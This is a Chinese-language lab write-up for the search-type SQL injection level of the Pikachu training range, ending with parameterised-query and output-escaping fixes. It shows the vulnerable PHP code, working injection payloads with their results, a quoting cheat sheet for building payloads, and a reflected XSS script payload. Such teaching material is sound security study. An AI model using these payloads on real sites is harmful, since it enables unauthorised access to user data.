# 搜索型注入 通关笔记
> 搜索框看着人畜无害，但它的 SQL 是 `like '%关键词%'`——
>
> **`%` 和 `'` 都在你输入的外面，所以闭合要比普通字符型多处理一个 `%`。**
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → 搜索型注入 |
| 页面地址 | `http://pikachu/vul/sqli/sqli_search.php` |
| 提交方式 | GET |
| 参数名 | `name` |
| 目标 | 通过搜索框拿到数据库数据 |
页面提示：「请输入用户名进行查找，如果记不住用户名，输入用户名的一部分搜索的试试看？」
---
## 二、我的解题步骤
### 步骤 1：先正常搜一次
输入 `k`：
```
用户名中含有k的结果如下：
username：kobe
uid:3
email is: kobe@pikachu.com
```
再输入 `ke`，出来 kevin。
**说明这是模糊匹配。**
### 步骤 2：试探闭合
根据模糊搜索的常识，SQL 大概是：
```sql
select ... from member where username like '%关键词%'
```
先输入一个 `'`：
```
1'
```
页面报 SQL 语法错误——确认存在注入。
### 步骤 3：构造闭合
因为外面是 `'%...%'`，payload 要先闭合 `%'`：
```
1' or 1=1#
```
代入：
```sql
select username,id,email from member where username like '%1' or 1=1#%'
```
- `'%1'` 闭合掉前半部分
- `or 1=1` 恒真
- `#` 注释掉后面的 `%'`
### 步骤 4：结果
我实测的对比：
| 输入 | 返回 |
| --- | --- |
| `k` | **1 条**（kobe） |
| `1' or 1=1#` | **7 条**（整张表） |

## 三、原理分析
### 3.1 源码
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是模糊匹配，需要考虑闭合
    $query="select username,id,email from member where username like '%$name%'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        //彩蛋:这里还有个xss
        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
        while($data=mysqli_fetch_assoc($result)){
            ...
        }
    }
}
```
作者注释点出了两件事：
1. 模糊匹配，**需要考虑闭合**
2. **这里还有个 XSS**
### 3.2 为什么比普通字符型多一步
普通字符型：
```sql
where username='$name'
```
闭合只需要 `'`。
搜索型：
```sql
where username like '%$name%'
```
外面有两层：`'` 和 `%`。所以 payload 要写成：
```
1' or 1=1#
```
代入后：
```sql
where username like '%1' or 1=1#%'
```
`'%1'` 是一个完整的字符串字面量（内容 `%1`），然后用 `or 1=1` 接上条件。
**注意：这里其实没用到 `%`，因为 `or 1=1` 直接绕过了 like 匹配。**
### 3.3 另一种闭合写法
也可以写成：
```
%' or 1=1#
```
```sql
where username like '%%' or 1=1#'
```
`'%%'` 匹配所有，再加 `or 1=1`。
**两种都行，看个人习惯。**
### 3.4 彩蛋：这里的 XSS
看这行：
```php
$html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
```
`$_GET['name']` 被**原样**输出到页面。
所以搜索框里也能打 XSS：
```
<script>alert(1)</script>
```
这关同时存在 **SQL 注入 + XSS** 两个漏洞——因为输入既进了数据库查询，又进了 HTML 输出。

## 四、知识点与笔记
### 4.1 搜索型注入的判断
| 输入 | 结果 | 说明 |
| --- | --- | --- |
| `k` | 有结果 | 基准 |
| `k'` | 报错 | 引号破坏语法 |
| `k%'` | 可能正常 | 闭合了 `%` 和 `'` |
| `k' or 1=1#` | 全表 | 确认注入 |
### 4.2 常见闭合速查
| SQL 形式 | payload 开头 |
| --- | --- |
| `'$x'` | `' or 1=1#` |
| `'%$x%'` | `%' or 1=1#` 或 `' or 1=1#` |
| `('%$x%')` | `%') or 1=1#` |
| `like "%$x%"` | `%" or 1=1#` |
### 4.3 怎么根据报错推断闭合
报错通常是：
```
You have an error in your SQL syntax; ... near '...' at line 1
```
**`near` 后面那一小段，就是 SQL 解析器"卡住"的位置。**
比如输入 `1'` 报：
```
near '%''
```
说明 `%'` 附近出问题——那就知道后面跟着 `%'`。
**报错信息就是"体检报告"，能看出外面包了什么。**
### 4.4 搜索框是最容易忽略的注入点
开发者的心理：
> "搜索只是查一下，不改数据，问题不大。"
但事实上：
- 搜索框同样拼接 SQL
- 同样能 `union` 出整张表
- 而且**搜索框通常不需要登录**
**越是"只读"的功能，越容易没人管。**

## 五、和字符型的区别
| | 字符型 | 搜索型 |
| --- | --- | --- |
| SQL | `where name='$x'` | `where name like '%$x%'` |
| 外层 | `'` | `'%` ... `%'` |
| payload | `x' or 1=1#` | `x' or 1=1#`（也能用） |
| 额外风险 | 无 | **同时有 XSS** |
**闭合思路一样，只是外面的壳更厚。**

## 六、防御怎么写
### 6.1 参数化
```php
$stmt = $link->prepare("select username,id,email from member where username like ?");
$like = '%' . $name . '%';
$stmt->bind_param('s', $like);
$stmt->execute();
```
**注意**：`%` 要拼在**参数值**里，而不是 SQL 里。
### 6.2 同时修 XSS
```php
$show = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
$html2 .= "<p class='notice'>用户名中含有{$show}的结果如下：</p>";
```
### 6.3 转义 `%` 和 `_`
如果用户输入的 `%` 不应该被当通配符：
```php
$like = '%' . str_replace(['%', '_'], ['\%', '\_'], $name) . '%';
```
这不是安全问题，但能避免"用户搜 `%` 就返回全部"的尴尬。

## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 模糊搜索的闭合 |
| SQL 形式 | `like '%$x%'` |
| payload | `1' or 1=1#` |
| 实测 | 1 条 → 7 条 |
| 彩蛋 | 同时存在 XSS |
| 修复 | 参数化 + 输出转义 |
**一句话**：
> **搜索框看起来很"无害"，但它一样在拼 SQL——而且它往往不需要登录。**
